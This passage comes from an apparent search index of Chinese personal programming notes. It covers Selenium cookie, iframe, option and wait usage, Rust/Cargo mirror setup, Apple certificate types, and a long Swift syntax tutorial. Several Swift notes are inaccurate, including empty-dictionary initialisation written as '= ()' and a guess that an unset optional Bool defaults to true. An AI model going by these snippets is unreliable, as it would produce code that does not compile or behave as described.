\"bar\"})\n\n# Get cookie details with named cookie 'foo'\nprint(driver.get_cookie(\"foo\")) 获取全部 Cookies 此方法会针对当前访问上下文返回\"成功的序列化cookie数据\".\n如果浏览器不再可用, 则返回错误.: from selenium import webdriver\n\ndriver = webdriver.Chrome()\n\n# Navigate to url\ndriver.get(\"http://www.example.com\")\n\ndriver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"})\ndriver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"})\n\n# Get all available cookies\nprint(driver.get_cookies()) 删除 Cookie 此方法删除与提供的cookie名称匹配的cookie数据.: from selenium import webdriver\ndriver = webdriver.Chrome()\n\n# Navigate to url\ndriver.get(\"http://www.example.com\")\ndriver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"})\ndriver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"})\n\n# Delete a cookie with name 'test1'\ndriver.delete_cookie(\"test1\") 删除所有 Cookies 此方法删除当前访问上下文的所有cookie.: from selenium import webdriver\ndriver = webdriver.Chrome()\n\n# Navigate to url\ndriver.get(\"http://www.example.com\")\ndriver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"})\ndriver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"})\n\n#  Deletes all cookies\ndriver.delete_all_cookies() Same-Site Cookie属性 此属性允许用户引导浏览器控制cookie, 是否与第三方站点发起的请求一起发送.\n引入其是为了防止CSRF（跨站请求伪造）攻击. Same-Site cookie属性接受以下两种参数作为指令: Strict: 当sameSite属性设置为 Strict, cookie不会与来自第三方网站的请求一起发送. Lax: 当您将cookie sameSite属性设置为 Lax, cookie将与第三方网站发起的GET请求一起发送.\n注意: 到目前为止, 此功能已在Chrome(80+版本), Firefox(79+版本)中提供, 并适用于Selenium 4以及更高版本. 用例: from selenium import webdriver\n\ndriver = webdriver.Chrome()\n\ndriver.get(\"http://www.example.com\")\n# Adds the cookie into current browser context with sameSite 'Strict' (or) 'Lax'\ndriver.add_cookie({\"name\": \"foo\", \"value\": \"value\", 'sameSite': 'Strict'})\ndriver.add_cookie({\"name\": \"foo1\", \"value\": \"value\", 'sameSite': 'Lax'})\ncookie1 = driver.get_cookie('foo')\ncookie2 = driver.get_cookie('foo1')\nprint(cookie1)\nprint(cookie2) 与IFrames和frames一起工作 框架是一种现在已被弃用的方法，用于从同一域中的多个文档构建站点布局。\n除非你使用的是 HTML5 之前的 webapp，否则你不太可能与他们合作。\n内嵌框架允许插入来自完全不同领域的文档，并且仍然经常使用。 如果您需要使用框架或 iframe, WebDriver 允许您以相同的方式使用它们。\n考虑 iframe 中的一个按钮。 如果我们使用浏览器开发工具检查元素，我们可能会看到以下内容: <div id=\"modal\">\n  <iframe id=\"buttonframe\"name=\"myframe\"src=\"https://seleniumhq.github.io\">\n  <button>Click here</button>\n</iframe>\n</div> 如果不是 iframe，我们可能会使用如下方式点击按钮: // 这不会工作\ndriver.find_element(By.TAG_NAME, 'button').click() 但是，如果 iframe 之外没有按钮，那么您可能会得到一个 no such element 无此元素 的错误。\n这是因为 Selenium 只知道顶层文档中的元素。\n为了与按钮进行交互，我们需要首先 切换到框架 ， 这与切换窗口的方式类似。 WebDriver 提供了三种切换到帧的方法。 使用 WebElement 使用 WebElement 进行切换是最灵活的选择: # 存储网页元素\niframe = driver.find_element(By.CSS_SELECTOR, \"#modal > iframe\")\n\n    # 切换到选择的 iframe\ndriver.switch_to.frame(iframe)\n\n    # 单击按钮\ndriver.find_element(By.TAG_NAME, 'button').click() 使用 name 或 id 如果您的 frame 或 iframe 具有 id 或 name 属性，则可以使用该属性。\n如果名称或 id 在页面上不是唯一的， 那么将切换到找到的第一个。: # 通过 id 切换框架\ndriver.switch_to.frame('buttonframe')\n\n    # 单击按钮\ndriver.find_element(By.TAG_NAME, 'button').click() 使用索引 还可以使用frame的索引， 例如可以使用JavaScript中的 window.frames 进行查询.: # 基于索引切换到第 2 个 iframe\niframe = driver.find_elements(By.TAG_NAME,'iframe')[1]\n\n    # 切换到选择的 iframe\ndriver.switch_to.frame(iframe) 离开框架 离开 iframe 或 frameset，切换回默认内容，如下所示: # 切回到默认内容\ndriver.switch_to.default_content() 同窗口和标签一起工作 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/windows/ 窗口切换/关闭, 屏幕截图, 执行脚本 虚拟身份验证器 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/virtual_authenticator/","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Interaction.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Interaction.html"},{"title":"原理/结构","text":"Selenium所做的一切, 就是发送给浏览器命令, 用以执行某些操作或为信息发送请求. 启动一个驱动实例: driver = webdriver.Chrome() 打开指定的网页: driver.get(\"https://www.selenium.dev/selenium/web/web-form.html\") 获取网页信息: title = driver.title 建立等待策略\n将代码与浏览器的当前状态同步 是Selenium面临的最大挑战之一, 做好它是一个高级主题.\n基本上, 您希望在尝试定位元素之前, 确保该元素位于页面上, 并且在尝试与该元素交互之前, 该元素处于可交互状态.\n隐式等待很少是最好的解决方案, 但在这里最容易演示,: driver.implicitly_wait(0.5) 发送命令 查找元素: text_box = driver.find_element(by=By.NAME, value=\"my-text\")\nsubmit_button = driver.find_element(by=By.CSS_SELECTOR, value=\"button\") 操作元素: # 填充 Selenium\ntext_box.send_keys(\"Selenium\")\nsubmit_button.click() 获取元素信息: driver.find_element(by=By.ID, value=\"message\")\ntext = message.text 结束会话, 即结束驱动程序进程, 默认情况下, 该进程也会关闭浏览器. 无法向此驱动程序实例发送更多命令: driver.quit()","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html"},{"title":"服务","text":"Driver Service Class 服务类用于管理驱动程序的启动和停止. They can not be used with a Remote WebDriver session(不能用于远程会话). 默认会话实例: service = webdriver.ChromeService()\ndriver = webdriver.Chrome(service=service) 设置使用本地驱动: service = webdriver.ChromeService(executable_path=chromedriver_bin) 指定端口启动: service = webdriver.ChromeService(port=1234)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-Serve.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-Serve.html"},{"title":"chrome支持的选项","text":"从指定位置启动浏览器(即Chrome执行文件路径),\nbinary 参数接收一个使用浏览器的备用路径,\n通过这个参数你可以使用chromedriver 去驱动各种基于Chromium 内核的浏览器.: options.binary_location = chrome_bin 增加插件: options.add_extension(extension_file_path) 保持浏览器的打开状态\n将 detach 参数设置为true将在驱动过程结束后保持浏览器的打开状态: options.add_experimental_option(\"detach\", True) 排除的参数,\nChrome 添加了各种参数，如果你不希望添加某些参数，\n可以将其传入 excludeSwitches. 一个常见的例子是重新打开弹出窗口阻止程序.: options.add_experimental_option('excludeSwitches', ['disable-popup-blocking']) 指定日志输出: service = webdriver.ChromeService(log_output=log_path) 指定控制台输出: service = webdriver.ChromeService(log_output=subprocess.STDOUT) 指定日志等级: service = webdriver.ChromeService(service_args=['--log-level=DEBUG'], log_output=subprocess.STDOUT) 指定日志效果(支持 append log 和 readable timestamps ): service = webdriver.ChromeService(service_args=['--append-log', '--readable-timestamp'], log_output=log_path) 禁用版本检查,\n默认会检查驱动与浏览器的版本是否一致: service = webdriver.ChromeService(service_args=['--disable-build-check'], log_output=subprocess.STDOUT)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html"},{"title":"等待","text":"隐式等待 对所有元素有效.\n使用 driver.implicitly_wait(2) 显式等待 对指定元素有效.\n每次都需要建立WebDriverWait对象: wait = WebDriverWait(driver, timeout=2)\nwait.until(lambda d : revealed.is_displayed()) 还支持条件设置: errors = [NoSuchElementException, ElementNotInteractableException]\nwait = WebDriverWait(driver, timeout=2, poll_frequency=.2, ignored_exceptions=errors)\nwait.until(lambda d : revealed.send_keys(\"Displayed\") or True)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-wait.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-wait.html"},{"title":"trio","text":"官网文档:: trio 貌似是一个比较新的异步编程库, 相对 asyncio 来说, 目前支持的库还是比较少的, 不过 PySide6 文档中举例使用了这个库. 后面有空再补充.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-trio.html","loc":"/yq-docs-rear-end-python-python-three--party-library-trio.html"},{"title":"yarl","text":"一个URL处理的模块, 类似Vscode的\"URI\"模块","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-yarl.html","loc":"/yq-docs-rear-end-python-python-three--party-library-yarl.html"},{"title":"Rust","text":"安装参考: https://rustup.rs/ 国内源配置 Mac 更新配置文件: vim ~/.bash_profile 新增如下内容(使用中科大代理): export RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static\nexport RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup\n\n# 使用 rsproxy 代理\n# export RUSTUP_DIST_SERVER=\"https://rsproxy.cn\"\n# export RUSTUP_UPDATE_ROOT=\"https://rsproxy.cn/rustup\" 让修改生效: source ~/.bash_profile Windows10 设置如下环境变量: RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static\nRUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup 升级 code: rustup check\nrustup update 配置 Cargo 使用国内镜像 更新文件 ~/.cargo/config`（windows 10 下为 `C:Users<用户名>.cargoconfig ），\n没有就新建: [source.crates-io]\nregistry = \"https://github.com/rust-lang/crates.io-index\"\n\n# 替换成要使用的镜像\nreplace-with = 'rsproxy'\n\n# 中国科学技术大学\n[source.ustc]\nregistry = \"git://mirrors.ustc.edu.cn/crates.io-index\"\n# 如果所处的环境中不允许使用 git 协议，可以把上述地址改为 https 协议\n#registry = \"https://mirrors.ustc.edu.cn/crates.io-index\"\n\n# 清华大学\n[source.tuna]\nregistry = \"https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git\"\n\n# 上海交通大学\n[source.sjtu]\nregistry = \"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index\"\n\n# rustcc 社区\n[source.rustcc]\nregistry = \"git://crates.rustcc.cn/crates.io-index\"\n\n# rsproxy\n[source.rsproxy]\nregistry = \"https://rsproxy.cn/crates.io-index\"\n[source.rsproxy-sparse]\nregistry = \"sparse+https://rsproxy.cn/index/\"\n[registries.rsproxy]\nindex = \"https://rsproxy.cn/crates.io-index\"\n\n[net]\ngit-fetch-with-cli=true 若 使用 cargo build 命令仍然报错如下错误: blocking waiting for file lock on package(包) cache lock 可删除文件 ~/.cargo/.package-cache 然后重试。","tags":"后端","url":"/yq-docs-rear-end-rust-index.html","loc":"/yq-docs-rear-end-rust-index.html"},{"title":"Apple证书类型","text":"开发的设备要在其他设备上运行,\n需要有证书 宏观来说有两种 Apple开发: 普通的带证书的本地开发, 直接使用自己账户登陆,\n证书选择开发者, 就会默认生成一个可用的证书(免费, 有效期一年), 过期了再重复即可, Apple分发: 用于在其他设备运行, 发布到Apple Store, 个人账号688/y 参考: Apple官网-证书 Apple官网-证书类型","tags":"后端","url":"/yq-docs-rear-end-swift-Apple-certificate-type.html","loc":"/yq-docs-rear-end-swift-Apple-certificate-type.html"},{"title":"常见属性包装器","text":"@State . @StateObject @StateObject属性包装器与类似@State，只不过它适用于ObservableObject。\n一个ObservableObject始终是引用类型 (class)，并且每当其@Published属性之一发生更改时都会通知。 @Binding . @ObservedObject 以便视图可以观察外部对象的状态，并在重要内容发生变化时收到通知。 @Published 允许我们创建可观察的对象，并且在发生更改时触发视图重绘。我们经常将@Published与ObservableObject协议结合使用。 此部分可参考: https://juejin.cn/post/7319706549915156499","tags":"后端","url":"/yq-docs-rear-end-swift-Attribute-packaging.html","loc":"/yq-docs-rear-end-swift-Attribute-packaging.html"},{"title":"基本语法","text":"常识了解 Swift Playground 可视为一个可交互的文档， 所写即所得 内置关键字 let 常量定义 var 变量定义 print 打印输出 typealias 定义类型别名 如定义了 Int 的类型别名为 Feet: typealias Feet = Int guard guard语句和if语句有点类似，都是根据其关键字之后的表达式的布尔值决定下一步执行什么。\n但与if语句不同的是，guard语句只会有一个代码块，不像if语句可以if else多个代码块。 那么guard语句的作用到底是什么呢？顾名思义，就是守护。\nguard语句判断其后的表达式布尔值为false时，才会执行之后代码块里的代码，\n如果为true，则跳过整个guard语句: // 检查身份证，如果身份证没带，则不能进入考场\nguard let id = person[\"id\"] else {\n    print(\"没有身份证，不能进入考场!\")\n    return\n} 内置数据类型 Int 整型 UInt 无符号整型 尽量不要使用UInt，除非你真的需要存储一个和当前平台原生字长相同的无符号整数。\n除了这种情况，最好使用Int，即使你要存储的值已知是非负的。\n统一使用Int可以提高代码的可复用性，避免不同类型数字之间的转换，并且匹配数字的类型推断。 注解 整数类型需要注意以下几点： 在 32 位系统上, Int 和 Int32 长度相同。 在 64 位系统上, Int 和 Int64 长度相同。 在 32 位系统上, UInt 和 UInt32 长度相同。 在 64 位系统上, UInt 和 UInt64 长度相同。 Int8, Int16, Int32, Int64 分别表示 8 位, 16 位, 32 位, 和 64 位的有符号整数形式。 UInt8, UInt16, UInt32, UInt64 分别表示 8 位, 16 位, 32 位 和 64 位的无符号整数形式。 Float 32浮点数，精度要求不高的话可以使用此类型。 浮点类型比整数类型表示的范围更大，可以存储比 Int 类型更大或者更小的数字 Double 64位浮点数，当你需要存储很大或者很高精度的浮点数时请使用此类型。 注解 Double精确度很高，至少有15位数字，\n而 Float 最少只有6位数字。\n选择哪个类型取决于你的代码需要处理的值的范围。 Bool 布尔值 基本的布尔（Boolean）类型，叫做 Bool。布尔值指逻辑上的值，因为它们只能是真或者假。\nSwift 有两个布尔常量，true 和 false。 String 字符串是字符的序列集合 Character 字符指的是单个字母 Optional 使用可选类型来处理值可能缺失的情况。可选类型表示有值或没有值。 如以下两种声明相等: var optionalInteger: Int?\nvar optionalInteger: Optional<Int> 当你声明一个可选变量或者可选属性的时候没有提供初始值，它的值会默认为 nil 若为布尔， 貌似默认为true 如果一个可选类型的实例包含一个值，你可以用后缀操作符 ！来访问这个值: optionalInteger = 42\noptionalInteger! // 42 当你确定可选类型确实包含值之后，你可以在可选的名字后面加一个感叹号（!）来获取值，\n这被称为可选值的 强制解析（forced unwrapping） 这部分(问号/叹号)的使用, 与ts基本一致 注解 使用!来获取一个不存在的可选值会导致运行时错误。\n使用!来强制解析值之前，一定要确定可选包含一个非nil的值。 可选绑定 使用可选绑定（optional binding）来判断可选类型是否包含值，\n如果包含就把值赋给一个临时常量或者变量。 可选绑定可以用在if和while语句中来对可选类型的值进行判断并把值赋给一个常量或者变量。 实例: import Cocoa\n\nvar myString:String?\n\nmyString = \"Hello, Swift!\"\n\nif let yourString = myString {\n  print(\"你的字符串值为 - \\(yourString)\")\n}else{\n  print(\"你的字符串没有值\")\n} 以上程序执行结果为: 你的字符串值为 - Hello, Swift! Array todo Dictionary todo Struct todo Class todo 类型安全 Swift 是一个类型安全（type safe）的语言。 由于 Swift 是类型安全的，\n所以它会在编译你的代码时进行类型检查（type checks），并把不匹配的类型标记为错误。\n这可以让你在开发的时候尽早发现并修复错误。 类型推断 不需要每次声明常量和变量的时候都显式指定类型 如果你没有显式指定类型，Swift 会使用类型推断（type inference）来选择合适的类型。 当推断浮点数的类型时，Swift 总是会选择Double而不是Float。 如果表达式中同时出现了整数和浮点数，会被推断为Double类型 Swift 变量 变量是一种使用方便的占位符，用于引用计算机内存地址。 声明: var variableName = <initial value>\n\nvar varB:Float 变量名可以由字母，数字和下划线组成 变量名需要以字母或下划线开始 区分大小写 Swift 常量 设定后不可变 声明常量或者变量的时候可以加上类型标注（type annotation），\n说明常量或者变量中要存储的值的类型: var constantName:<data type> = <optional initial value> Swift 运算符 算术运算符 + - * / % , 分别表示 加 减 乘 除 求余 比较运算符 == 等于 !=  不等于 >   大于 <   小于 >=  大于等于 <=  小于等于 逻辑运算符 &&  逻辑与。如果运算符两侧都为 TRUE 则为 TRUE。 ||  逻辑或。 如果运算符两侧至少有一个为 TRUE 则为 TRUE。 !   逻辑非。布尔值取反，使得true变false，false变true。 位运算符 位运算符用来对二进制位进行操作， ~ & | &#94; << >> 分别为取反，按位与与，按位与或，按位与异或运算, 按位左移， 按位右移 赋值运算符 =   简单的赋值运算，指定右边操作数赋值给左边的操作数 +=  相加后再赋值，将左右两边的操作数相加后再赋值给左边的操作数。 -=  相减后再赋值，将左右两边的操作数相减后再赋值给左边的操作数。 *= 相乘后再赋值，将左右两边的操作数相乘后再赋值给左边的操作数。 /=  相除后再赋值，将左右两边的操作数相除后再赋值给左边的操作数 %=  求余后再赋值，将左右两边的操作数求余后再赋值给左边的操作数 <<= 按位左移后再赋值 >>= 按位右移后再赋值 &=  按位与运算后赋值 &#94;=  按位异或运算符后再赋值 |= 按位或运算后再赋值 区间运算符 闭区间运算符: 闭区间运算符 （a...b） 定义一个包含从a到b(包括a和b)的所有值的区间,\n必须大于等于a。 闭区间运算符在迭代一个区间的所有值时是非常有用的，\n如在for-in循环中: 1...5 区间值为 1, 2, 3, 4 和 5 半开区间运算符     半开区间（a..<b）定义一个从a到b但不包括b的区间。 之所以称为半开区间，\n是因为该区间包含第一个值而不包括最后的值。 如： 1..< 5 区间值为 1, 2, 3, 和 4 其他运算符 其他类型的的运算符，如一元、二元和三元运算符 一元减:        数字前添加 - 号前缀,    -3 或 -4 一元加:        数字前添加 + 号前缀,    +6 结果为 6 三元运算符:      condition ? X : Y,      如果 condition 为 true ，值为 X ，否则为 Y 重要 运算符优先级 优先级从上到下依次递减，最上面具有最高的优先级，逗号操作符具有最低的优先级。 相同优先级中，按结合顺序计算。大多数运算是从左至右计算，只有三个优先级是从右至左结合的，\n它们是单目运算符、条件运算符、赋值运算符。 基本的优先级需要记住： 指针最优，单目运算优于双目运算。如正负号。 先乘除（模），后加减。 先算术运算，后移位运算，最后位运算。\n特别注意： 1 << 3 + 2 & 7 等价于 (1 << (3 + 2))&7 逻辑运算最后计算 合并空值运算符：?? 合并空值运算符 a ?? b 如果可选项 a 有值则展开，如果没有值，是 nil，则返回默认值 b。 表达式 a 必须是一个可选类型，表达式 b 必须与 a 的存储类型相同 合并空值运算符，实际上是三元运算符作用到 Optional 上的缩写 a != nil ? a! : b 如果 a 的值是非空，b的值将不会被考虑，也就是合并空值运算符是短路的。 Swift 条件语句 if switch 最简便的就是三目: Exp1 ? Exp2 : Exp3; Swift 循环 for-in 遍历一个集合里面的所有元素，例如由数字表示的区间、数组中的元素、字符串中的字符。 for 循环 该循环方式在 Swift 3 中已经弃用。 用来重复执行一系列语句直到达成特定条件达成，\n一般通过在每次循环完成后增加计数器的值来实现。 while 循环 运行一系列语句，如果条件为true，会重复运行，直到条件变为false。 repeat...while 循环 类似 while 语句区别在于判断循环条件之前，先执行一次循环的代码块。 循环控制语句 continue 语句: 告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。 break 语句: 中断当前循环。 fallthrough 语句: 如果在一个case执行完后，继续执行下面的case，\n需要使用fallthrough(贯穿)关键字。 Swift 字符串 创建 可以通过使用字符串字面量或 String 类的实例来创建一个字符串: import Cocoa\n\n// 使用字符串字面量\nvar stringA = \"Hello, World!\"\nprint( stringA )\n\n// String 实例化\nvar stringB = String(\"Hello, World!\")\nprint( stringB ) 初始化空的字符串 可以使用空的字符串字面量赋值给变量或初始化一个String类的实例来初始值一个空的字符串,\n使用字符串属性 isEmpty 来判断字符串是否为空: import Cocoa\n\n// 使用字符串字面量创建空字符串\nvar stringA = \"\"\n// 实例化 String 类来创建空字符串\n// let stringB = String()\n\nif stringA.isEmpty {\n  print( \"stringA 是空的\" )\n} else {\n  print( \"stringA 不是空的\" ) 字符串中插入值 插入的字符串字面量的每一项都在以反斜线为前缀的圆括号中: import Cocoa\n\nvar varA   = 20\nlet constA = 100\nvar varC:Float = 20.0\n\nvar stringA = \"\\(varA) 乘于 \\(constA) 等于 \\(varC * 100)\"\nprint( stringA ) 字符串连接 字符串可以通过 + 号来连接 字符串长度 字符串长度使用 String.count 属性来计算 字符串比较 使用 == 来比较两个字符串是否相等 Unicode 字符串 Unicode 是一个国际标准，用于文本的编码，Swift 的 String 类型是基于 Unicode建立的。\n你可以循环迭代出字符串中 UTF-8 与 UTF-16 的编码: import Cocoa\n\nvar unicodeString   = \"菜鸟教程\"\n\nprint(\"UTF-8 编码: \")\nfor code in unicodeString.utf8 {\n  print(\"\\(code) \")\n}\n\nprint(\"\\n\")\n\nprint(\"UTF-16 编码: \")\nfor code in unicodeString.utf16 {\n  print(\"\\(code) \")\n} 字符串函数及运算符 isEmpty: 判断字符串是否为空，返回布尔值 hasPrefix(prefix: String): 检查字符串是否拥有特定前缀 hasSuffix(suffix: String): 检查字符串是否拥有特定后缀。 Int(String): 转换字符串数字为整型 String.count: Swift 3 版本使用的是 String.characters.count, 计算字符串的长度 utf8: 您可以通过遍历 String 的 utf8 属性来访问它的 UTF-8 编码 utf16: 您可以通过遍历 String 的 utf16 属性来访问它的 utf16 编码 unicodeScalars: 您可以通过遍历String值的unicodeScalars属性来访问它的 Unicode 标量编码. +: 连接两个字符串，并返回一个新的字符串 +=: 连接操作符两边的字符串并将新字符串赋值给左边的操作符变量 ==: 判断两个字符串是否相等 <: 比较两个字符串，对两个字符串的字母逐一比较。 !=: 比较两个字符串是否不相等。 Swift 字符(Character) 空字符变量 Swift 中不能创建空的 Character（字符） 类型变量或常量 遍历字符串中的字符 Swift 3 中的 String 需要通过 characters 去调用的属性方法，\n在 Swift 4 中可以通过 String 对象本身直接调用，例如: import Cocoa\n\nfor ch in \"Runoob\" {\n    print(ch)\n} 字符串连接字符 使用 String 的 append() 方法来实现字符串连接字符 Swift 数组 如果创建一个数组，并赋值给一个变量，则创建的集合就是可以修改的。这意味着在创建数组后，可以通过添加、删除、修改的方式改变数组里的项目。 如果将一个数组赋值给常量，数组就不可更改，并且数组的大小和内容都不可以修改。 创建数组 可以使用构造语法来创建一个由特定数据类型构成的空数组： var someArray = [SomeType]() 以下是创建一个初始化大小数组的语法: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) 以下实例创建了一个类型为 Int ，数量为 3，初始值为 0 的空数组: var someInts = [Int](repeating: 0, count: 3) 以下实例创建了含有三个元素的数组: var someInts:[Int] = [10, 20, 30] 访问数组 根据数组的索引来访问数组的元素，语法如下: var someVar = someArray[index] 修改数组 可以使用 append() 方法或者赋值运算符 += 在数组末尾添加元素 也可以通过索引修改数组元素的值 遍历数组 可以使用for-in循环来遍历所有数组中的数据项 合并数组 可以使用加法操作符（+）来合并两种已存在的相同类型数组 count 属性 使用 count 属性来计算数组元素个数 isEmpty 属性 通过只读属性 isEmpty 来判断数组是否为空 注解 创建数组的方法 推荐: var names: [String] = []\nvar lookup: [String: Int] = [:] 不推荐: var names = [String]()\nvar lookup = [String: Int]() Swift 字典 Swift 字典用来存储无序的相同类型数据的集合，Swift 字典会强制检测元素的类型，如果类型不同则会报错。 Swift 字典每个值（value）都关联唯一的键（key），键作为字典中的这个值数据的标识符 如果创建一个字典，并赋值给一个变量，则创建的字典就是可以修改的。这意味着在创建字典后，可以通过添加、删除、修改的方式改变字典里的项目。 如果将一个字典赋值给常量，字典就不可修改，并且字典的大小和内容都不可以修改。 创建字典 可以使用以下语法来创建一个特定类型的空字典: // var someDict =  [KeyType: ValueType]()\nvar someDict: [KeyType: ValueType] = () 以下是创建一个空字典，键的类型为 Int，值的类型为 String 的简单语法: // var someDict = [Int: String]()\nvar someDict: [Int: String] = () 以下为创建一个字典的实例: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] 访问字典 我们可以根据字典的索引来访问数组的元素，语法如下: var someVar = someDict[key] 修改字典 可以使用 updateValue(forKey:) 增加或更新字典的内容。\n如果 key 不存在，则添加值，如果存在则修改 key 对应的值。 updateValue(_:forKey:)方法返回被修改的Optional值 也可以通过指定的 key 来修改字典的值 移除 Key-Value 对 可以使用 removeValueForKey() 方法来移除字典 key-value 对 如果 key 存在该方法返回移除的值，如果不存在返回 nil 遍历字典 我们可以使用 for-in 循环来遍历某个字典中的键值对: import Cocoa\n\nvar someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"]\n\nfor (key, value) in someDict {\n  print(\"字典 key \\(key) -  字典 value \\(value)\")\n} 字典转换为数组 可以提取字典的键值(key-value)对，并转换为独立的数组: import Cocoa\n\nvar someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"]\n\nlet dictKeys = [Int](someDict.keys)\nlet dictValues = [String](someDict.values) count 属性 可以使用只读的 count 属性来计算字典有多少个键值对 isEmpty 属性 可以通过只读属性 isEmpty 来判断字典是否为空 Swift 函数 函数定义: func funcname(形参) -> returntype\n{\n  Statement1\n  Statement2\n  ……\n  Statement N\n  return parameters\n} 可变参数 可变参数可以接受零个或多个值. 通过在变量类型名后面加入（...）的方式来定义 常量，变量及 I/O 参数 一般默认在函数中定义的参数都是常量参数，也就是这个参数你只可以查询使用，不能改变它的值。\n如果想要声明一个变量参数，可以在参数定义前加 inout 关键字，这样就可以改变这个参数的值了 例如: func  getName(_ name: inout String)......... 一般默认的参数传递都是传值调用的，而不是传引用。所以传入的参数在函数内改变，并不影响原来的那个参数。传入的只是这个参数的副本。 当传入的参数作为输入输出参数时，需要在参数名前加 & 符，表示这个值可以被函数修改。 实例: import Cocoa\n\nfunc swapTwoInts(_ a: inout Int, _ b: inout Int) {\n    let temporaryA = a\n    a = b\n    b = temporaryA\n}\n\n\nvar x = 1\nvar y = 5\nswapTwoInts(&x, &y)\nprint(\"x 现在的值 \\(x), y 现在的值 \\(y)\") 使用函数类型 可以定义一个类型为函数的常量或变量，并将适当的函数赋值给它: var addition: (Int, Int) -> Int = sum Swift 闭包 闭包(Closures)是自包含的功能代码块，可以在代码中使用或者用来作为参数传值。 Swift 中的闭包与 C 和 Objective-C 中的代码块（blocks）以及其他一些编程语言中的 匿名函数比较相似。 全局函数和嵌套函数其实就是特殊的闭包 大多数情况下, Swift的闭包相当于匿名函数, 比如: let driver = {\n  print(\"is driver\")\n} 调用: driver 但是这并不意味着不能使用参数, 需要的参数是被写在花括号里面的 :\n为了让一个闭包接收参数，\n需要在 花括号之后把这些参数列出来，然后跟上一个 in 关键字 。\n这样就告诉Swift，闭包的主体是从哪里开始的: let driver = { (place: String) in\n  print(\"is driver in \\(place)\")\n} 函数和闭包的一个区别是运行闭包的时候你不会用到参数标签,\n直接调用即可: driver(\"秋名山\") 若需要指定返回值: let driver = { (place: String) -> String in\n  return \"is driver in \\(place)\"\n} 拖尾闭包语法 如果一个函数的最后一个参数是闭包，\nSwift允许你采用一种被称为 \"拖尾闭包语法\" 的方式来调用这个闭包。\n你可以把闭包传入函数之后的花括号里，而不必像传入参数那样。 以下为例: func travel(action: () -> Void) {\n  print(\"我准备开车了。\")\n  action()\n  print(\"我已抵达。\")\n} 正常一般会这样调用: travel(action: driver) 由于函数的最后一个参数是闭包，我们可以用拖尾闭包语法来调用\n上一节的driver: travel() {\n  print(\"is driver\")\n} 或者: travel() {\n  print(\"is driver\")\n} 实际上，由于函数没有别的参数了，我们还可以将圆括号完全移除: travel {\n  print(\"is driver\")\n} 若要接受参数: func travel(action: (String) -> Void)\n... 若需要带返回值: travel { (place: String) -> String in\n  return \"is driver in \\(place)\"\n} 若知道place与返回类型, 可以去掉注解,\n同时因为主体只有一行代码, 所以return也可以去掉,\n即: travel { place in\n  \"is driver in \\(place)\"\n} Swift还提供一种速记语法，让你可以把代码变得更短。\n我们可以让Swift为闭包的参数自动提供一个名字，而不必自行写下 place in。\n这些自动生成的名字以$开头，然后跟着一个从0开始的整数，就像下面这样: travel {\n  \"is driver in \\($0)。\"\n} Swift 枚举 枚举简单的说也是一种数据类型，只不过是这种数据类型只包含自定义的特定数据，它是一组有共同特性的数据的集合。 Swift 的枚举类似于 Objective C 和 C 的结构，枚举的功能为: 它声明在类中，可以通过实例化类来访问它的值。 枚举也可以定义构造函数（initializers）来提供一个初始成员值；可以在原始的实现基础上扩展它们的功能。 可以遵守协议（protocols）来提供标准的功能。 定义: enum enumname {\n  // 枚举定义放在这里\n  case 变量\n} case关键词表示一行新的成员值将被定义。 重要 和 C 和 Objective-C 不同，Swift 的枚举成员在被创建时不会被赋予一个默认的整型值 Swift 结构体 Swift 结构体是构建代码所用的一种通用且灵活的构造体。 我们可以为结构体定义属性（常量、变量）和添加方法，从而扩展结构体的功能。 与 C 和 Objective C 不同的是： 结构体不需要包含实现文件和接口。 结构体允许我们创建一个单一文件，且系统会自动生成面向其它代码的外部接口。 结构体总是通过被复制的方式在代码中传递，因此它的值是不可修改的。 值传递 通过关键字 struct 来定义结构体: struct nameStruct {\n  Definition 1\n  Definition 2\n  ……\n  Definition N\n} Swift 类 在一个单一文件中定义一个类，系统会自动生成面向其它代码的外部接口。 恒等运算符 判定两个常量或者变量是否引用同一个类实例，Swift 内建了两个恒等运算符 === : 两个常量或者变量引用同一个类实例则返回 true !== : 两个常量或者变量引用不同一个类实例则返回 true Swift 属性 存储属性 一个存储属性就是存储在特定类或结构体的实例里的一个常量或变量 延迟存储属性 当第一次被调用的时候才会计算其初始值的属性 在属性声明前使用 lazy 来标示一个延迟存储属性,\n且必须声明为var变量 一般用于： 延迟对象的创建。 当属性的值依赖于其他未知类 计算属性 除存储属性外，类、结构体和枚举可以定义计算属性，计算属性不直接存储值，\n而是提供一个 getter 来获取值，一个可选的 setter 来间接设置其他属性或变量的值。 只读计算属性 只有 getter 没有 setter 